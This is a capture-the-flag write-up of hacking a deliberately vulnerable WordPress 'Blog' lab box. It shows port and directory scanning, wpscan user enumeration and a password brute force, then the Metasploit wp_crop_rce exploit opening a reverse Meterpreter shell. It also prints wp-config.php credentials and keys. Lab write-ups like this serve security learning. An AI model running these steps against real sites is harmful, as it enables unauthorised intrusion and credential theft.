# Blog

Apparently Billy Joel made a blog. My friend Jeff Rowell wanted to do this box, so here we go :)

## Enumeration

nmap:

```bash
➜  ~ export IP=10.10.100.137 
➜  ~ $IP
zsh: command not found: 10.10.100.137
➜  ~ sudo nmap -sC -sV -Pn -n $IP
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-19 12:55 MDT
Nmap scan report for 10.10.100.137
Host is up (0.19s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 57:8a:da:90:ba:ed:3a:47:0c:05:a3:f7:a8:0a:8d:78 (RSA)
|   256 c2:64:ef:ab:b1:9a:1c:87:58:7c:4b:d5:0f:20:46:26 (ECDSA)
|_  256 5a:f2:62:92:11:8e:ad:8a:9b:23:82:2d:ad:53:bc:16 (ED25519)
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: WordPress 5.0
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Billy Joel&#039;s IT Blog &#8211; The IT blog
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: BLOG; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_nbstat: NetBIOS name: BLOG, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: blog
|   NetBIOS computer name: BLOG\x00
|   Domain name: \x00
|   FQDN: blog
|_  System time: 2020-07-19T18:56:06+00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-07-19T18:56:07
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.24 seconds
```

gobuster:

```bash
➜  ~ gobuster dir -t 150 -u http://$IP -w Desktop/wordlist2.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.100.137
[+] Threads:        150
[+] Wordlist:       Desktop/wordlist2.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/07/19 12:58:34 Starting gobuster
===============================================================
/atom (Status: 301)
/wp-content (Status: 301)
/admin (Status: 302)
/rss (Status: 301)
/feed (Status: 301)
/rss2 (Status: 301)
/wp-includes (Status: 301)
/wp-admin (Status: 301)
/server-status (Status: 403)
```

I had to add blog.thm to my `/etc/hosts/` file to properly load the contents of this box. Once I did that, I was able to successfully start navigating all the directories enumerated by gobuster. 

## Sniffing Credentials

Samba was being utilized, so I connected to it and was greeted with 3 files. One was a QR code that resolved to Billy Joels We Didn't Start the Fire on YouTube. rekt. 


Googling around for how to hack wordpress, I discovered a tool called wpscan. It even had a `brew` formulae!

```bash
wpscan --url http://10.10.195.1 --enumerate u

_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.3
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://10.10.195.1/ [10.10.195.1]
[+] Started: Sun Jul 19 14:58:03 2020

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] http://10.10.195.1/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.195.1/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] http://10.10.195.1/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://10.10.195.1/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.10.195.1/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.0 identified (Insecure, released on 2018-12-06).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://10.10.195.1/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=5.0'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://10.10.195.1/, Match: 'WordPress 5.0'

[i] The main theme could not be detected.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:01 <===========================================================================================================> (10 / 10) 100.00% Time: 00:00:01

[i] User(s) Identified:

[+] bjoel
 | Found By: Wp Json Api (Aggressive Detection)
 |  - http://10.10.195.1/wp-json/wp/v2/users/?per_page=100&page=1
 | Confirmed By:
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] kwheel
 | Found By: Wp Json Api (Aggressive Detection)
 |  - http://10.10.195.1/wp-json/wp/v2/users/?per_page=100&page=1
 | Confirmed By:
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] Karen Wheeler
 | Found By: Rss Generator (Aggressive Detection)

[+] Billy Joel
 | Found By: Rss Generator (Aggressive Detection)

[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up

[+] Finished: Sun Jul 19 14:58:17 2020
[+] Requests Done: 53
[+] Cached Requests: 8
[+] Data Sent: 12.232 KB
[+] Data Received: 460.381 KB
[+] Memory used: 144.062 MB
[+] Elapsed time: 00:00:13

```

Looks like we have some user names to prod and potentially bruteforce passwords for! I used the rockyou password wordlist for this bruteforce. 

## Privilege Escalation

```bash
➜  ~ wpscan --url http://10.10.34.96/wp-login.php --passwords Downloads/rockyou.txt --usernames bjoel,kwheel --wp-content-dir http://10.10.34.96/wp-login.php --force --max-threads 25 
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.3
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://10.10.34.96/wp-login.php/ [10.10.34.96]
[+] Started: Sun Jul 19 15:44:28 2020

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] http://10.10.34.96/wp-login.php/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] This site seems to be a multisite
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | Reference: http://codex.wordpress.org/Glossary#Multisite

[+] The external WP-Cron seems to be enabled: http://10.10.34.96/wp-login.php/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

Fingerprinting the version - Time: 00:01:21 <========================================================================================================> (455 / 455) 100.00% Time: 00:01:21
[i] The WordPress version could not be detected.

[i] The main theme could not be detected.

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:02 <============================================================================================================> (21 / 21) 100.00% Time: 00:00:02

[i] No Config Backups Found.

[+] Performing password attack on Wp Login against 2 user/s
[SUCCESS] - kwheel / cutiepie1                  
```

Well looks like we have one password, for bjoels sweet mom (if you browsed the blog). Now that we're in, we're greeted with a non admin dashboard. Using ```searchsploit``` I found a remote code execution exploit that could be used against this version of wordpress. 

## Exploitation

Now that I had user access, all I needed to do was find an exploit. I simply googled "wordpress 5.0 exploit" and used the very first link to find an exploit to use in metasploit:

```bash
msf5 > search crop-image

Matching Modules
================

   #  Name                            Disclosure Date  Rank       Check  Description
   -  ----                            ---------------  ----       -----  -----------
   0  exploit/multi/http/wp_crop_rce  2019-02-19       excellent  Yes    WordPress Crop-image Shell Upload


msf5 > use exploit/multi/http/wp_crop_rce
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf5 exploit(multi/http/wp_crop_rce) > shiow targets
[-] Unknown command: shiow.
msf5 exploit(multi/http/wp_crop_rce) > show targets

Exploit targets:

   Id  Name
   --  ----
   0   WordPress


msf5 exploit(multi/http/wp_crop_rce) > show options

Module options (exploit/multi/http/wp_crop_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD                    yes       The WordPress password to authenticate with
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path to the wordpress application
   USERNAME                    yes       The WordPress username to authenticate with
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.1.233    yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   WordPress


msf5 exploit(multi/http/wp_crop_rce) > set PASSWORD cutiepie1
PASSWORD => cutiepie1
msf5 exploit(multi/http/wp_crop_rce) > set RHOSTS 10.10.192.244
RHOSTS => 10.10.192.244
msf5 exploit(multi/http/wp_crop_rce) > set RPORT 80
RPORT => 80
msf5 exploit(multi/http/wp_crop_rce) > set USERNAME kwheel
USERNAME => kwheel
msf5 exploit(multi/http/wp_crop_rce) > set LHOST 10.2.27.38
LHOST => 10.2.27.38
msf5 exploit(multi/http/wp_crop_rce) > exploit

[*] Started reverse TCP handler on 10.2.27.38:4444 
[*] Authenticating with WordPress using kwheel:cutiepie1...
[+] Authenticated with WordPress
[*] Preparing payload...
[*] Uploading payload
[+] Image uploaded
[*] Including into theme
[*] Sending stage (38288 bytes) to 10.10.192.244
[*] Meterpreter session 1 opened (10.2.27.38:4444 -> 10.10.192.244:54102) at 2020-07-19 22:06:52 -0600
[*] Attempting to clean up files...

meterpreter > sysinfo
Computer    : blog
OS          : Linux blog 4.15.0-101-generic #102-Ubuntu SMP Mon May 11 10:07:26 UTC 2020 x86_64
Meterpreter : php/linux
meterpreter > ls
Listing: /var/www/wordpress
===========================

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
100640/rw-r-----  235    fil   2020-05-28 06:15:42 -0600  .htaccess
100640/rw-r-----  235    fil   2020-05-27 21:44:26 -0600  .htaccess_backup
100644/rw-r--r--  1111   fil   2020-07-19 22:06:52 -0600  HlLuRjTCth.php
100640/rw-r-----  418    fil   2013-09-24 18:18:11 -0600  index.php
100640/rw-r-----  19935  fil   2020-05-26 09:39:37 -0600  license.txt
100640/rw-r-----  7415   fil   2020-05-26 09:39:37 -0600  readme.html
100640/rw-r-----  5458   fil   2020-05-26 09:39:37 -0600  wp-activate.php
40750/rwxr-x---   4096   dir   2018-12-06 11:00:07 -0700  wp-admin
100640/rw-r-----  364    fil   2015-12-19 04:20:28 -0700  wp-blog-header.php
100640/rw-r-----  1889   fil   2018-05-02 16:11:25 -0600  wp-comments-post.php
100640/rw-r-----  2853   fil   2015-12-16 02:58:26 -0700  wp-config-sample.php
100640/rw-r-----  3279   fil   2020-05-27 21:49:17 -0600  wp-config.php
40750/rwxr-x---   4096   dir   2020-05-25 21:52:32 -0600  wp-content
100640/rw-r-----  3669   fil   2017-08-19 22:37:45 -0600  wp-cron.php
40750/rwxr-x---   12288  dir   2018-12-06 11:00:08 -0700  wp-includes
100640/rw-r-----  2422   fil   2016-11-20 19:46:30 -0700  wp-links-opml.php
100640/rw-r-----  3306   fil   2017-08-22 05:52:48 -0600  wp-load.php
100640/rw-r-----  37286  fil   2020-05-26 09:39:37 -0600  wp-login.php
100640/rw-r-----  8048   fil   2017-01-10 22:13:43 -0700  wp-mail.php
100640/rw-r-----  17421  fil   2018-10-23 01:04:39 -0600  wp-settings.php
100640/rw-r-----  30091  fil   2018-04-29 17:10:26 -0600  wp-signup.php
100640/rw-r-----  4620   fil   2017-10-23 16:12:51 -0600  wp-trackback.php
100640/rw-r-----  3065   fil   2016-08-31 10:31:29 -0600  xmlrpc.php
```

I'm in! Lets start looking around to see how I can get some sweet sweet privilege escalation

## Privilege Escalation #2


I leveraged nmaps ```http-wordpress-enum``` script to give me extra information about our wordpress instance:

```bash
➜  ~ nmap -sV --script http-wordpress-enum 10.10.188.234
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-20 11:50 MDT
Nmap scan report for blog.thm (10.10.188.234)
Host is up (0.19s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-wordpress-enum: 
| Search limited to top 100 themes/plugins
|   themes
|     twentysixteen 2.1
|_    twentyseventeen 2.3
```

Doing a little poking around in wp-config.php, I noticed some MySQL credentials and keys that were stored within the file:

```bash
meterpreter > cat wp-config.php
<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://codex.wordpress.org/Editing_wp-config.php
 *
 * @package WordPress
 */

/* Custom */
/*
define('WP_HOME', '/');
define('WP_SITEURL', '/'); */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'blog');

/** MySQL database username */
define('DB_USER', 'wordpressuser');

/** MySQL database password */
define('DB_PASSWORD', 'LittleYellowLamp90!@');

/** MySQL hostname */
define('DB_HOST', 'localhost');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');

/** Custom FS Method */
define('FS_METHOD', 'direct');

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define('AUTH_KEY',         'ZCgJQaT0(*+Zjo}Iualapeo|?~nMtp^1IUrquYx3!#T$ihW8F~_`L+$N E>J!Bm;');
define('SECURE_AUTH_KEY',  'nz|(+d|| yVX-5_on76q%:M, ?{NVJ,Q(;p3t|_B*]-yQ&|]3}M@Po!f_,T-S4fe');
define('LOGGED_IN_KEY',    'a&I&DR;PUnPKul^kLBgxYa@`g||{eZf><sf8SmKBi+R7`O?](SuL&/H#hqzO$_:3');
define('NONCE_KEY',        'Vdd-zzB:/yxg6unZvng,oY-%Z V,i%+Uz_f)S;Efz!;cY3p~]T,g1z*Z[jXe>5Sm');
define('AUTH_SALT',        'u+k8g;=jbe)6/X~<M1HwINhH(Tno@orx:$_$-#*id)ddBYGGF(]AP?}4?2E|m;5`');
define('SECURE_AUTH_SALT', '>Rg5>,/^BywVg^A[Etqot:CoU+9<)YPM~h|)Ifd5!iK!L*5+JDiZi33KrYZNd2B7');
define('LOGGED_IN_SALT',   '3kpL-rcnU+>H#t/g>9<)j/u I1/-Ws;h6GrDQ>v8%7@C~`h1lBC/euttp)/8EdA_');
define('NONCE_SALT',       'JEajZ)y?&.m-1^$(c-JX$zi0qv|7]F%7a6jh]P5SRs+%`*60?WJVk$><b$poQg9>');
```

Too bad there's no MySQL database found on this box, so no MySQL server I could log into with these creds...hmm...